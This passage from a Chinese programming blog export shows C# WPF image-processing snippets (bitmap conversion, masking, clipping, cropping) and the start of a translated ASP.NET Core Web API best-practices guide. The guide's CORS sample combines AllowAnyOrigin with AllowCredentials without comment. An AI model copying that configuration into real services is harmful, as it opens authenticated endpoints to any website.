class="line"><span class="comment">//BitmapImage  to  Bitmap</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Bitmap <span class="title">GetBitmapByBitmapImage</span>(<span class="params"><span class="keyword">this</span> BitmapImage bitmapImage,<span class="keyword">bool</span> isPng=<span class="literal">false</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Bitmap bitmap;</span><br><span class="line">    MemoryStream outStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">    BitmapEncoder enc = <span class="keyword">new</span> BmpBitmapEncoder();</span><br><span class="line">    <span class="keyword">if</span> (isPng) </span><br><span class="line">    &#123;</span><br><span class="line">        enc = <span class="keyword">new</span> PngBitmapEncoder();</span><br><span class="line">    &#125;</span><br><span class="line">    enc.Frames.Add(BitmapFrame.Create(bitmapImage));</span><br><span class="line">    enc.Save(outStream);</span><br><span class="line">    bitmap = <span class="keyword">new</span> Bitmap(outStream);</span><br><span class="line">    <span class="keyword">return</span> bitmap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bitmap  to BitmapImage</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BitmapImage <span class="title">GetBitmapImageBybitmap</span>(<span class="params"><span class="keyword">this</span> Bitmap bitmap</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BitmapImage bitmapImage = <span class="keyword">new</span> BitmapImage();</span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (MemoryStream ms = <span class="keyword">new</span> MemoryStream()) </span><br><span class="line">        &#123;</span><br><span class="line">            bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);</span><br><span class="line">            bitmapImage.BeginInit();</span><br><span class="line">            bitmapImage.StreamSource = ms;</span><br><span class="line">            bitmapImage.CacheOption = BitmapCacheOption.OnLoad;</span><br><span class="line">            bitmapImage.EndInit();</span><br><span class="line">            bitmapImage.Freeze();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) </span><br><span class="line">    &#123;</span><br><span class="line">        log.ErrorFormat(<span class="string">"bitmap to BitmapImage Failed:"</span> + ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> bitmapImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Visual-和-DrawingContext"><a href="#Visual-和-DrawingContext" class="headerlink" title="Visual 和 DrawingContext"></a>Visual 和 DrawingContext</h2><h3 id="Visual"><a href="#Visual" class="headerlink" title="Visual"></a>Visual</h3><blockquote>
<p>Visual：为 WPF 中的呈现提供支持，其中包括命中测试、坐标转换和边界框计算。</p>
</blockquote>
<p>层级关系：<br>System.Windows.Media.Visual<br>&emsp;&emsp;System.Windows.Media.ContainerVisual<br>&emsp;&emsp;&emsp;&emsp;System.Windows.UIElement</p>
<h3 id="DrawingContext"><a href="#DrawingContext" class="headerlink" title="DrawingContext"></a>DrawingContext</h3><blockquote>
<p>DrawingContext：使用绘图、推送和弹出命令描述可视内容。</p>
</blockquote>
<p>绘制方法：</p>
<ul>
<li>DrawDrawing：画 Drawing 对象</li>
<li>DrawEllipse：画圆</li>
<li>DrawGeometry：画几何图形</li>
<li>DrawGlyphRun：画文字</li>
<li>DrawImage： 画图</li>
<li>DrawLine：画线</li>
<li>DrawRectangle / DrawRoundedRectangle：画矩形</li>
<li>DrawText：画带格式的文本</li>
<li>DrawVideo：画视频</li>
<li>PushClip：推送剪切区域</li>
</ul>
<h3 id="RenderTargetBitmap"><a href="#RenderTargetBitmap" class="headerlink" title="RenderTargetBitmap"></a>RenderTargetBitmap</h3><blockquote>
<p>RenderTargetBitmap：将 System.Windows.Media.Visual 对象转换为位图。</p>
</blockquote>
<h3 id="Image-遮罩-1"><a href="#Image-遮罩-1" class="headerlink" title="Image 遮罩"></a>Image 遮罩</h3><p>和控件方式类似，在后台代码中使用 Visual 来展示</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span class="line">RenderTargetBitmap bmp = <span class="keyword">new</span> RenderTargetBitmap((<span class="keyword">int</span>)img.Source.Width, (<span class="keyword">int</span>)img.Source.Height, <span class="number">96</span>, <span class="number">96</span>, PixelFormats.Default);</span><br><span class="line">DrawingVisual visual = <span class="keyword">new</span> DrawingVisual() &#123; OpacityMask = imgBrush &#125;;    <span class="comment">//遮罩Visual</span></span><br><span class="line"><span class="keyword">using</span> (DrawingContext dc = visual.RenderOpen()) </span><br><span class="line">&#123;</span><br><span class="line">    dc.DrawImage(img.Source, <span class="keyword">new</span> Rect(<span class="number">0</span>, <span class="number">0</span>, img.Source.Width, img.Source.Height));</span><br><span class="line">&#125;</span><br><span class="line">bmp.Render(visual);</span><br></pre></td></tr></table></figure>

<h3 id="图像变化"><a href="#图像变化" class="headerlink" title="图像变化"></a>图像变化</h3><p>同样是修改 Visual 的 Transform<br><strong>这里注意：文件渲染的 Transform 和前台的 Transform 不全相同！</strong><br><strong>因为界面显示的图片大小和实际大小不一样</strong></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span class="line">Copy</span><br><span class="line">RenderTargetBitmap bmp = <span class="keyword">new</span> RenderTargetBitmap((<span class="keyword">int</span>)img.Source.Width, (<span class="keyword">int</span>)img.Source.Height, <span class="number">96</span>, <span class="number">96</span>, PixelFormats.Default);</span><br><span class="line">DrawingVisual visual = <span class="keyword">new</span> DrawingVisual() &#123; Transform = img.RenderTransform &#125;;    <span class="comment">//修改 Transform</span></span><br><span class="line"><span class="keyword">using</span> (DrawingContext dc = visual.RenderOpen()) </span><br><span class="line">&#123;</span><br><span class="line">    dc.DrawImage(img.Source, <span class="keyword">new</span> Rect(<span class="number">0</span>, <span class="number">0</span>, img.Source.Width, img.Source.Height));</span><br><span class="line">&#125;</span><br><span class="line">bmp.Render(visual);</span><br></pre></td></tr></table></figure>

<h3 id="PathGeometry"><a href="#PathGeometry" class="headerlink" title="PathGeometry"></a>PathGeometry</h3><blockquote>
<p>来自微软官方的解释：表示一个可能由弧、曲线、椭圆、直线和矩形组成的复杂形状</p>
</blockquote>
<blockquote>
<p>LineGeometry 直线<br><strong>PS：这个 LineGeometry 可以实现线头和线尾的圆滑笔触效果</strong>  </p>
<p>EllipseGeometry 圆<br>RectangleGeometry 矩形</p>
</blockquote>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span class="line"><span class="keyword">new</span> LineGeometry(start, end).GetWidenedPathGeometry(<span class="keyword">new</span> Pen(Brushes.Black, <span class="number">10</span>) &#123; StartLineCap = PenLineCap.Round, EndLineCap = PenLineCap.Round &#125;);</span><br></pre></td></tr></table></figure>

<h3 id="抠图"><a href="#抠图" class="headerlink" title="抠图"></a>抠图</h3><p>通过 DrawingContext 的 PushClip 可以将指定的剪辑区域推送到绘图上下文上。<br>需要利用到上面的 Geometry 几何图形<br>配合一些鼠标事件可以手动实现 inkcanvas 和类似 PS 的背景橡皮擦  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span class="line">RenderTargetBitmap bmp = <span class="keyword">new</span> RenderTargetBitmap((<span class="keyword">int</span>)img.Source.Width, (<span class="keyword">int</span>)img.Source.Height, <span class="number">96</span>, <span class="number">96</span>, PixelFormats.Default);</span><br><span class="line">DrawingVisual visual = <span class="keyword">new</span> DrawingVisual() &#123; OpacityMask = imgBrush &#125;;    <span class="comment">//遮罩 Visual</span></span><br><span class="line"><span class="keyword">using</span> (DrawingContext dc = visual.RenderOpen()) </span><br><span class="line">&#123;</span><br><span class="line">    RectangleGeometry full = <span class="keyword">new</span> RectangleGeometry(<span class="keyword">new</span> Rect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">777</span>,<span class="number">523</span>));    <span class="comment">//全图区域</span></span><br><span class="line">    <span class="keyword">var</span> clip= Geometry.Combine(full, <span class="keyword">new</span> RectangleGeometry(<span class="keyword">new</span> Rect(<span class="number">200</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">300</span>)), GeometryCombineMode.Exclude, <span class="literal">null</span>);    <span class="comment">//减去一个矩形的区域</span></span><br><span class="line">    dc.PushClip(clip);    <span class="comment">//推送 clip 区域结果</span></span><br><span class="line">    dc.DrawImage(img.Source, <span class="keyword">new</span> Rect(<span class="number">0</span>, <span class="number">0</span>, img.Source.Width, img.Source.Height));</span><br><span class="line">&#125;</span><br><span class="line">bmp.Render(visual);</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="1339560-20191219154338688-1538991805.png" alt="正方形抠图" title class>
                <p>正方形抠图</p>
            </figure>
<figure class="image-box">
                <img src="1339560-20191219154606518-534744335.png" alt="线条抠图" title class>
                <p>线条抠图</p>
            </figure>

<h3 id="裁剪"><a href="#裁剪" class="headerlink" title="裁剪"></a>裁剪</h3><ul>
<li>BitmapSource 中有一个方法叫做 CopyPixels，复制像素点集到一个新的 BitmapSource 里面。可以实现裁剪</li>
</ul>
<blockquote>
<p>stride：位图的跨距（一行的字节数）。<br>pixels：表示位图图像内容的字节数组。</p>
</blockquote>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BitmapSource <span class="title">CutImage</span>(<span class="params">BitmapSource bitmapSource, Int32Rect cut</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//计算Stride</span></span><br><span class="line">    <span class="keyword">var</span> stride = bitmapSource.Format.BitsPerPixel * cut.Width / <span class="number">8</span>;</span><br><span class="line">    <span class="comment">//声明字节数组</span></span><br><span class="line">    <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[cut.Height * stride];</span><br><span class="line">    <span class="comment">//调用CopyPixels</span></span><br><span class="line">    bitmapSource.CopyPixels(cut, data, stride, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> BitmapSource.Create(cut.Width, cut.Height, <span class="number">0</span>, <span class="number">0</span>, PixelFormats.Bgra32, <span class="literal">null</span>, data, stride);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="1339560-20191219154400596-61755557.png" alt title class>
                <p></p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> WPF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ASP.NET Core Web API 最佳实践指南]]></title>
      <url>/2019/12/19/AspNetCoreWebApiBestPracticesGuide/</url>
      <content type="html"><![CDATA[<blockquote>
<p>译文：<a href="https://www.cnblogs.com/hippieZhou/p/11966373.html" target="_blank" rel="noopener">https://www.cnblogs.com/hippieZhou/p/11966373.html</a><br>原文：<a href="https://code-maze.us12.list-manage.com/track/click?u=9bb15645129501e5249a9a8e1&id=986d07e1f0&e=1184a539da" target="_blank" rel="noopener">ASP.NET-Core-Web-API-Best-Practices-Guide</a>  </p>
</blockquote>
<a id="more"></a>

<p><strong>目录</strong></p>
<ul>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#介绍">介绍</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#Startup-类-和-服务配置">Startup 类 和 服务配置</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#项目组织">项目组织</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#基于环境的设置">基于环境的设置</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#数据访问层">数据访问层</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#控制器">控制器</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#处理全局异常">处理全局异常</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#使用过滤器移除重复代码">使用过滤器移除重复代码</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#Microsoft-AspNetCore-All-元包">Microsoft.AspNetCore.All 元包</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#路由（ROUTING）">路由</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#日志（LOGGING）">日志</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#加密">加密</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#内容协商">内容协商</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#使用-JWT">使用 JWT</a></li>
<li><a href="https://tao-lol.top/2019/12/19/AspNetCoreWebApiBestPracticesGuide/#总结">总结</a></li>
</ul>
<figure class="image-box">
                <img src="749711-20191202210059663-465533847.png" alt title class>
                <p></p>
            </figure>

<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>&emsp;&emsp;当我们编写一个项目的时候，我们的主要目标是使它能如期运行，并尽可能地满足所有用户需求。<br>&emsp;&emsp;但是，你难道不认为创建一个能正常工作的项目还不够吗？同时这个项目不应该也是可维护和可读的吗？<br>&emsp;&emsp;事实证明，我们需要把更多的关注点放到我们项目的可读性和可维护性上。这背后的主要原因是我们或许不是这个项目的唯一编写者。一旦我们完成后，其他人也极有可能会加入到这里面来。<br>&emsp;&emsp;因此，我们应该把关注点放到哪里呢？<br>&emsp;&emsp;在这一份指南中，关于开发 .NET Core Web API 项目，我们将叙述一些我们认为会是最佳实践的方式。进而让我们的项目变得更好和更加具有可维护性。<br>&emsp;&emsp;现在，让我们开始想一些可以应用到 ASP.NET Web API 项目中的一些最佳实践。  </p>
<h1 id="Startup-类-和-服务配置"><a href="#Startup-类-和-服务配置" class="headerlink" title="Startup 类 和 服务配置"></a>Startup 类 和 服务配置</h1><blockquote>
<p>STARTUP CLASS AND THE SERVICE CONFIGURATION</p>
</blockquote>
<p>&emsp;&emsp;在 <code>Startup</code> 类中，有两个方法：<code>ConfigureServices</code> 是用于服务注册，<code>Configure</code> 方法是向应用程序的请求管道中添加中间件。<br>&emsp;&emsp;因此，最好的方式是保持 <code>ConfigureServices</code> 方法简洁，并且尽可能地具有可读性。当然，我们需要在该方法内部编写代码来注册服务，但是我们可以通过使用 <code>扩展方法</code> 来让我们的代码更加地可读和可维护。<br>&emsp;&emsp;例如，让我们看一个注册 CORS 服务的不好方式：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddCors(options =&gt; </span><br><span class="line">    &#123;</span><br><span class="line">        options.AddPolicy(<span class="string">"CorsPolicy"</span>, builder =&gt; builder.AllowAnyOrigin()</span><br><span class="line">            .AllowAnyMethod()</span><br><span class="line">            .AllowAnyHeader()</span><br><span class="line">            .AllowCredentials());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;尽管这种方式看起来挺好，也能正常地将 CORS 服务注册成功。但是想象一下，在注册了十几个服务之后这个方法体的长度。<br>&emsp;&emsp;这样一点也不具有可读性。<br>&emsp;&emsp;一种好的方式是通过在扩展类中创建静态方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">ServiceExtensions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ConfigureCors</span>(<span class="params"><span class="keyword">this</span> IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        services.AddCors(options =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">            options.AddPolicy(<span class="string">"CorsPolicy"</span>, builder =&gt; builder.AllowAnyOrigin()</span><br><span class="line">                .AllowAnyMethod()</span><br><span class="line">                .AllowAnyHeader()</span><br><span class="line">                .AllowCredentials());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，只需要调用这个扩展方法即可：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.ConfigureCors();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;了解更多关于 .NET Core 的项目配置，请查看：<a href="https://code-maze.com/net-core-web-development-part2/" target="_blank" rel="noopener">.NET Core Project Configuration</a>  </p>
<h1 id="项目组织"><a href="#项目组织" class="headerlink" title="项目组织"></a>项目组织</h1><blockquote>
<p>PROJECT ORGANIZATION</p>
</blockquote>
<p>&emsp;&emsp;我们应该尝试将我们的应用程序拆分为多个小项目。通过这种方式，我们可以获得最佳的项目组织方式，并能将关注点分离（SoC）。我们的实体、契约、访问数据库操作、记录信息或者发送邮件的业务逻辑应该始终放在单独的 .NET Core 类库项目中。<br>&emsp;&emsp;应用程序中的每个小项目都应该包含多个文件夹用来组织业务逻辑。<br>&emsp;&emsp;这里有个简单的示例用来展示一个复杂的项目应该如何组织：</p>
<figure class="image-box">
                <img src="749711-20191202210211630-1582297257.png" alt title class>
                <p></p>
            </figure>

<h1 id="基于环境的设置"><a href="#基于环境的设置" class="headerlink" title="基于环境的设置"></a>基于环境的设置</h1><blockquote>
<p>ENVIRONMENT BASED SETTINGS</p>
</blockquote>
<p>&emsp;&emsp;当我们开发应用程序时，它处于开发环境。但是一旦我们发布之后，它将处于生产环境。因此，将每个环境进行隔离配置往往是一种好的实践方式。<br>&emsp;&emsp;在 .NET Core 中，这一点很容易实现。<br>&emsp;&emsp;一旦我们创建好了项目，就已经有一个 <code>appsettings.json</code> 文件，当我们展开它时会看到 <code>appsettings.Development.json</code> 文件：</p>
<figure class="image-box">
                <img src="749711-20191202210228362-471063224.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;此文件中的所有设置将用于开发环境。<br>&emsp;&emsp;我们应该添加另一个文件 <code>appsettings.Production.json</code>，将其用于生产环境：</p>
<figure class="image-box">
                <img src="749711-20191202210241965-1672669642.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;生产文件将位于开发文件下面。<br>&emsp;&emsp;设置修改后，我们就可以通过不同的 appsettings 文件来加载不同的配置，取决于我们应用程序当前所处环境，.NET Core 将会给我们提供正确的设置。更多关于这一主题，请查阅：<a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/environments?view=aspnetcore-3.0" target="_blank" rel="noopener">Use Multiple Environments in ASP.NET Core</a>  </p>
<h1 id="数据访问层"><a href="#数据访问层" class="headerlink" title="数据访问层"></a>数据访问层</h1><blockquote>
<p>DATA ACCESS LAYER</p>
</blockquote>
<p>&emsp;&emsp;在一些不同的示例教程中，我们可能看到 DAL 的实现在主项目中，并且每个控制器中都有实例。我们不建议这么做。<br>&emsp;&emsp;当我们编写 DAL 时，我们应该将其作为一个独立的服务来创建。在 .NET Core 项目中，这一点很重要，因为当我们将 DAL 作为一个独立的服务时，我们就可以将其直接注入到 IOC（控制反转）容器中。IOC 是 .NET Core 内置功能。通过这种方式，我们可以在任何控制器中通过构造函数注入的方式来使用。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OwnerController</span>: <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IRepository _repository;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OwnerController</span>(<span class="params">IRepository repository</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _repository = repository;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h1><blockquote>
<p>CONTROLLERS</p>
</blockquote>
<p>&emsp;&emsp;控制器应该始终尽量保持整洁。我们不应该将任何业务逻辑放置于内。<br>&emsp;&emsp;因此，我们的控制器应该通过构造函数注入的方式接收服务实例，并组织 HTTP 的操作方法（GET，POST，PUT，DELETE，PATCH…）：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OwnerController</span> : <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ILoggerManager _logger;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IRepository _repository;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OwnerController</span>(<span class="params">ILoggerManager logger, IRepository repository</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _logger = logger;</span><br><span class="line">        _repository = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetAllOwners</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpGet(<span class="meta-string">"&#123;id&#125;"</span>, Name = <span class="meta-string">"OwnerById"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetOwnerById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpGet(<span class="meta-string">"&#123;id&#125;/account"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetOwnerWithDetails</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpPost</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">CreateOwner</span>(<span class="params">[FromBody]Owner owner</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpPut(<span class="meta-string">"&#123;id&#125;"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">UpdateOwner</span>(<span class="params">Guid id, [FromBody]Owner owner</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpDelete(<span class="meta-string">"&#123;id&#125;"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">DeleteOwner</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们的 Action 应该尽量保持简洁，它们的职责应该包括处理 HTTP 请求，验证模型，捕捉异常和返回响应。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpPost</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> IActionResult <span class="title">CreateOwner</span>(<span class="params">[FromBody]Owner owner</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (owner.IsObjectNull())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> BadRequest(<span class="string">"Owner object is null"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ModelState.IsValid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> BadRequest(<span class="string">"Invalid model object"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        _repository.Owner.CreateOwner(owner);</span><br><span class="line">        <span class="keyword">return</span> CreatedAtRoute(<span class="string">"OwnerById"</span>, <span class="keyword">new</span> &#123; id = owner.Id &#125;, owner);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        _logger.LogError(<span class="string">$"Something went wrong inside the CreateOwner action: <span class="subst">&#123; ex&#125;</span> "</span>);</span><br><span class="line">        <span class="keyword">return</span> StatusCode(<span class="number">500</span>, <span class="string">"Internal server error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在大多数情况下，我们的 action 应该将 <code>IActonResult</code> 作为返回类型（有时我们希望返回一个特定类型或者是 <code>JsonResult</code> …）。通过使用这种方式，我们可以很好地使用 .NET Core 中内置方法的返回值和状态码。  </p>
<p>&emsp;&emsp;使用最多的方法是：</p>
<ul>
<li>OK =&gt; returns the 200 status code</li>
<li>NotFound =&gt; returns the 404 status code</li>
<li>BadRequest =&gt; returns the 400 status code</li>
<li>NoContent =&gt; returns the 204 status code</li>
<li>Created, CreatedAtRoute, CreatedAtAction =&gt; returns the 201 status code</li>
<li>Unauthorized =&gt; returns the 401 status code</li>
<li>Forbid =&gt; returns the 403 status code</li>
<li>StatusCode =&gt; returns the status code we provide as input</li>
</ul>
<h1 id="处理全局异常"><a href="#处理全局异常" class="headerlink" title="处理全局异常"></a>处理全局异常</h1><blockquote>
<p>HANDLING ERRORS GLOBALLY</p>
</blockquote>
